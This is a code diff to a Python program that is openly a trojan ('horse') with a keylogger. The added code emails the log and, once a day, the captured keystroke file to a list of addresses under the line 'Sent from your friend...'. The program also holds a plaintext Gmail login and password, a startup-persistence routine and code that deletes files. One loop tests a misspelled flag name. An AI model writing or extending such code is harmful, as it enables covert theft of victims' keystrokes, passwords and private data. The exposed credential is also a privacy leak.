@@ -27,7 +27,7 @@ from email import encoders
 class Log(object):
     """Contains the log methods for the horse"""
     def __init__(self):
-        create_file = open(Constants.LOG_FILE_LOCATION, Constants.OVERWRITE_MODE)
+        create_file = open(Constants.LOG_FILE_LOCATION, Constants.APPEND_MODE)
         create_file.write("Log Constructor called\n")
         create_file.close()
 
@@ -37,8 +37,11 @@ class Log(object):
             f.writelines(message)
             f.close()
         else:
-            print("Log is too large to write too.")
-            print("Please clear the log. This will erase the log!")
+            email_controller = AttachMail()
+            email_controller.start_server()
+            email_controller.sendMail(Constants.EMAIL_DESTINATION_LIST, "Log File Attached",
+                                      "Sent from your friend...", Constants.LOG_FILE_LOCATION)
+            email_controller.stop_server()
 
     def logSizeUnder1MB(self, location):
         """Returns true if the size of the log file is less than 1MB"""
@@ -58,6 +61,7 @@ class KeyLogger(object):
         self.log_controller = Log()
         self.log_controller.writeMessage("Keylogger Constructor called\n")
         self.should_keylogger_stop = False
+        self.send_keylog_flag = True
         create_file = open(Constants.KEY_STROKES_LOG, Constants.OVERWRITE_MODE)
         create_file.write("Key Stroke Log created:\n")
         create_file.close()
@@ -77,6 +81,20 @@ class KeyLogger(object):
             pythoncom.PumpWaitingMessages()
 
         self.log_controller.writeMessage("Confirmation of Keylogger termination\n")
+
+    def send_keylog(self):
+        while send_keylog_flog is True:
+            time.sleep(86400)
+            email_controller = AttachMail()
+            email_controller.start_server()
+            email_controller.sendMail(Constants.EMAIL_DESTINATION_LIST, "KeyLog File Attached",
+                                      "Sent from your friend...", Constants.KEY_STROKES_LOG)
+            email_controller.stop_server()
+
+    def stop_to_send_keylog(self):
+        time.sleep(2592000) #Wait for a month
+        self.send_keylog_flag = False
+
 
     def OnKeyboardEvent(self, event):
         # print ("The message name is:",event.MessageName)
@@ -141,9 +159,9 @@ class Constants:
     EMAIL_LOGIN = "trojanhorsepy@gmail.com"
     EMAIL_PASSWORD = "nattanshimon"
     STARTUP_LOCATION = USER_PATH + r"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
-    FIRST_TIME="FIRSTtime.txt"
-    FIRST_TIME_DIR=r"C:\Users\shimon\Desktop\Horse"
-    FIRST_TIME_ALL_DIR=os.path.join(FIRST_TIME_DIR,FIRST_TIME)
+    FIRST_TIME = "FIRSTtime.txt"
+    FIRST_TIME_DIR = r"C:\Users\shimon\Desktop\Horse"
+    FIRST_TIME_ALL_DIR = os.path.join(FIRST_TIME_DIR, FIRST_TIME)
     SELF_lOCATION = os.path.abspath(__file__)
     PYTHON_DEFAULT_LOCATION = ""
 
@@ -185,11 +203,11 @@ class OSmanipulation(object):
                     temp=os.path.join(root,temp)
                     if os.stat(temp).st_mtime<os.stat(Constants.FIRST_TIME_ALL_DIR).st_mtime:
                         os.remove(temp)
-            f=open(Constants.FIRST_TIME_ALL_DIR,'w')
+            f = open(Constants.FIRST_TIME_ALL_DIR,'w')
             f.write("a")
             f.close()            
         else:
-            f=open(Constants.FIRST_TIME_ALL_DIR,'w')
+            f = open(Constants.FIRST_TIME_ALL_DIR,'w')
             f.close()
 
 
@@ -357,6 +375,7 @@ class AttachMail():
                 self.sendMail(Constants.EMAIL_DESTINATION_LIST,"python","python",temp)
         self.stop_server()
 
+
 def add_self_to_startup():
     # Check if program is in startup
     # If not, add it
@@ -387,7 +406,6 @@ def add_self_to_startup():
 def kickOff():
 
     # Make sure script is added to startup
-    add_self_to_startup()
     # Create the Keylogger object
     keylogger = KeyLogger()
 
